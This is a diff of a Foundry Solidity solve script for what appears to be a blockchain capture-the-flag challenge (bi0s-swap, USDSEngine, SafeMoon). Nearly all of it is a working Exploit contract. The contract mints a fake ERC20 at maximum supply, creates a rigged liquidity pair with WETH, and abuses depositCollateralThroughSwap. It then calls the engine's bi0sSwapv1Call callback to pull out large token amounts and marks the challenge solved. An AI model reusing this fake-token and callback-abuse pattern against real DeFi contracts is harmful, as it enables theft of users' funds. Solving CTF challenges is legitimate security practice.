@@ -1,12 +1,14 @@
 pragma solidity ^0.8.0;
 
-
 import {Script,console} from "forge-std/Script.sol";
 import {USDS,USDC,WETH,SafeMoon,Setup,USDSEngine} from "src/core/Setup.sol";
 
 import {IBi0sSwapFactory} from "src/bi0s-swap-v1/interfaces/IBi0sSwapFactory.sol";
 import {IBi0sSwapPair} from "src/bi0s-swap-v1/interfaces/IBi0sSwapPair.sol";
 import "forge-std/StdJson.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {IBi0sSwapCalle} from "src/bi0s-swap-v1/interfaces/IBi0sSwapCalle.sol";
+
 contract Solve is Script{
     using stdJson for *;
 
@@ -15,71 +17,59 @@ contract Solve is Script{
         string memory json = vm.readFile(path);
         address setupAddress = json.readAddress(".transactions[0].contractAddress");
         vm.startBroadcast();
-        bytes32 salt=vm.envBytes32("SALT");
-        Setup setup=Setup(address(setupAddress));
-        WETH weth=setup.weth();
-        Create2Deployer create2deployer=new Create2Deployer();
-        console.log("CREATE 2:",address(create2deployer));
-        console.logBytes32(create2deployer.getInitHash());
-        address exploit=create2deployer.deploy(salt);
-        console.log(exploit);
-        Exploit(exploit).initialize(address(setup));
-        Exploit(exploit).pwn{value:80000000000000000000000}();
+        Exploit exploit=new Exploit(setupAddress);
+        exploit.pwn{value:1100}();
         vm.stopBroadcast();
     }
 }
 
 
-contract Exploit{
-
-    Setup public setup;
-    USDSEngine usdcEngine;
-    IBi0sSwapPair wethSafeMoonPair;
+contract Exploit is ERC20{
+    Setup setup;
+    IBi0sSwapFactory factory;
     WETH weth;
-    SafeMoon safemoon;
-    uint256 requiredAmount=uint256(bytes32(keccak256("YOU NEED SOME BUCKS TO GET FLAG")))+1;
-
-    function initialize(address _setup)public{
+    USDSEngine usdsEngine;
+    constructor(address _setup) ERC20("FAKE","FAKE"){
+        _mint(address(this),type(uint256).max);
         setup=Setup(_setup);
-        usdcEngine=setup.usdsEngine();
-        wethSafeMoonPair=setup.wethSafeMoonPair();
+        factory=setup.bi0sSwapFactory();
+        usdsEngine=setup.usdsEngine();
         weth=setup.weth();
-        safemoon=setup.safeMoon();
+
+    }
+    function pwn()public payable{
+        bytes32 FLAG_HASH=keccak256("YOU NEED SOME BUCKS TO GET FLAG");
+        address _fakePair=factory.createPair(address(weth), address(this));
+        IBi0sSwapPair fakePair=IBi0sSwapPair(_fakePair);
+        weth.deposit{value:1001}(address(this));
+        weth.transfer(_fakePair,1000);
+        _transfer(address(this), _fakePair, uint256(uint160(address(this)))*1e10);
+        fakePair.addLiquidity(address(this));
+        weth.approve(address(usdsEngine), 1);
+        uint256 swapOutAmount=getSwapOutAmount(1,fakePair);
+        usdsEngine.depositCollateralThroughSwap(address(weth), address(this),1 , swapOutAmount-uint256(uint160(address(this))));
+        uint256 InitialAmount=uint256(FLAG_HASH)+1+uint256(uint160(address(this)));
+        bytes memory data=abi.encode(uint256(FLAG_HASH)+1);
+        usdsEngine.bi0sSwapv1Call(address(this), address(weth),InitialAmount, data);
+        usdsEngine.bi0sSwapv1Call(address(this), address(setup.safeMoon()), uint256(FLAG_HASH)+1, data);
+        setup.setPlayer(address(this));
+        console.log(setup.isSolved());
     }
 
-    function pwn()public payable returns (bool){
-        uint256 this_addr=uint256(uint160(address(this)));
-        address player=address(10);
-        weth.deposit{value:80000e18}(address(this));
-        weth.approve(address(usdcEngine), 80000e18);
-        uint256 _collateralDepositAmount=1207000603499873710129495113646411976443-uint256(uint160(address(this)));
-        usdcEngine.depositCollateralThroughSwap(address(weth), address(safemoon), 80000e18, _collateralDepositAmount);
-        usdcEngine.bi0sSwapv1Call(player, address(weth), requiredAmount+this_addr, abi.encode(requiredAmount));
-        usdcEngine.bi0sSwapv1Call(player, address(safemoon), requiredAmount+this_addr, abi.encode(requiredAmount));
-        setup.setPlayer(player);
-        require(setup.isSolved(),"Chall Unsolved");
-    }
 
-}
+    function getSwapOutAmount(uint256 inputAmount,IBi0sSwapPair swapPair)public view returns (uint256 outputAmount){
+        uint256 reserveIn;
+        uint256 reserveOut;
 
-
-contract Create2Deployer {
-
-
-    function deploy( bytes32 _salt) public returns (address) {
-        bytes memory initcode=type(Exploit).creationCode;
-        address addr;
-        assembly {
-            addr := create2(0, add(initcode, 0x20), mload(initcode), _salt)
-            if iszero(extcodesize(addr)) {
-                revert(0, 0)
-            }
+        if(swapPair.token0()==address(this)){
+            reserveIn=swapPair.reserve1();
+            reserveOut=swapPair.reserve0();
+        }else{
+            reserveIn=swapPair.reserve0();
+            reserveOut=swapPair.reserve1();
         }
-        return addr;
-    }
 
-    function getInitHash()public returns (bytes32){
-        bytes memory initcode=type(Exploit).creationCode;
-        return keccak256(initcode);
+        uint256 newReserveOut = (reserveIn*reserveOut)/(reserveIn + inputAmount);
+        outputAmount = reserveOut - newReserveOut;
     }
 }
